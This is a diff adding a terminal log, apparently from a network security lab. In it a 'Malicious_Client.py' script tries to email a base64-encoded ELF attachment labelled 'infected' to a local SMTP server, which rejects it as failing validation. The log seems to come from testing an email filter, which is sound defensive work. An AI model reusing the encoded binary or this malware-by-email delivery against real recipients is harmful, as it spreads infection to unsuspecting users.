@@ -1,0 +1,34 @@
+amitbin@ubuntu:~/Documents/Network_Security_Project$ python3 Malicious_Client.py 
+
+send: 'ehlo [127.0.1.1]\r\n'
+reply: b'250-ubuntu\r\n'
+reply: b'250-SIZE 33554432\r\n'
+reply: b'250-8BITMIME\r\n'
+reply: b'250 HELP\r\n'
+reply: retcode (250); Msg: b'ubuntu\nSIZE 33554432\n8BITMIME\nHELP'
+send: 'mail FROM:<sender@gmail.com> size=2922\r\n'
+reply: b'250 OK\r\n'
+reply: retcode (250); Msg: b'OK'
+send: 'rcpt TO:<receiver@gmail.com>\r\n'
+reply: b'250 OK\r\n'
+reply: retcode (250); Msg: b'OK'
+send: 'data\r\n'
+reply: b'354 End data with <CR><LF>.<CR><LF>\r\n'
+reply: retcode (354); Msg: b'End data with <CR><LF>.<CR><LF>'
+data: (354, b'End data with <CR><LF>.<CR><LF>')
+send: b'Content-Type: multipart/mixed; boundary="===============0847459062529758874=="\r\nMIME-Version: 1.0\r\nFrom: sender@gmail.com\r\nTo: receiver@gmail.com\r\nSubject: Malicious Email\r\nBcc: receiver@gmail.com\r\n\r\n--===============0847459062529758874==\r\nContent-Type: text/plain; charset="us-ascii"\r\nMIME-Version: 1.0\r\nContent-Transfer-Encoding: 7bit\r\n\r\nHello World!\r\nBest Regards, Amit Binenfeld.\r\n\r\n--===============0847459062529758874==\r\nContent-Type: application/octet-stream\r\nMIME-Version: 1.0\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename= Files/infected\r\n\r\n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\r\nFAAAAHQF6KgAAACNZfRZW15djWH8ww==\r\n\r\n--===============0847459062529758874==--\r\n.\r\n'
+reply: b'554 Email validation failed\r\n'
+reply: retcode (554); Msg: b'Email validation failed'
+data: (554, b'Email validation failed')
+send: 'rset\r\n'
+reply: b'250 OK\r\n'
+reply: retcode (250); Msg: b'OK'
+send: 'QUIT\r\n'
+reply: b'221 Bye\r\n'
+reply: retcode (221); Msg: b'Bye'
+Traceback (most recent call last):
+  File "Malicious_Client.py", line 50, in <module>
+    server.sendmail(sender_email, receiver_email, text)
+  File "/usr/lib/python3.6/smtplib.py", line 888, in sendmail
+    raise SMTPDataError(code, resp)
+smtplib.SMTPDataError: (554, b'Email validation failed')
